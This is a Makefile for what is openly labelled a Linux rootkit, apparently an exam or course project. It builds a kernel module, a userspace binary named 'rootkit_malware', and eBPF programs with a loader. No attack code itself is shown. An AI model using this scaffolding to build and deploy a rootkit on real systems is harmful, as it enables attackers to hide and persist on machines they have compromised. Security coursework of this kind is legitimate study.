obj-m += rootkit.o

KDIR := /home/ash/Downloads/kernel/exam/rootkit/build-sys-linux-6.19.9/

PWD  := $(shell pwd)

# eBPF
CLANG      := clang
BPF_CFLAGS := -O2 -g -target bpf -D__TARGET_ARCH_x86
BPF_DIR    := ebpf
BPF_SRCS   := $(wildcard $(BPF_DIR)/*.bpf.c)
BPF_OBJS   := $(BPF_SRCS:.bpf.c=.bpf.o)

all: modules userspace ebpf

modules:
	make -C $(KDIR) M=$(PWD) modules

userspace:
	gcc -Wall -Wextra -I$(PWD) -o rootkit_malware core.c

ebpf: $(BPF_OBJS) ebpf_loader

$(BPF_DIR)/%.bpf.o: $(BPF_DIR)/%.bpf.c $(BPF_DIR)/vmlinux.h $(BPF_DIR)/rk_bpf_common.h
	$(CLANG) $(BPF_CFLAGS) -I$(BPF_DIR) -c $< -o $@

ebpf_loader:
	gcc -Wall -Wextra -I$(BPF_DIR) -o $(BPF_DIR)/rk_ebpf_loader $(BPF_DIR)/rk_ebpf_loader.c -lbpf -lelf -lz

clean:
	make -C $(KDIR) M=$(PWD) clean
	rm -f rootkit_malware
	rm -f $(BPF_DIR)/*.bpf.o $(BPF_DIR)/rk_ebpf_loader

.PHONY: all modules userspace ebpf ebpf_loader clean
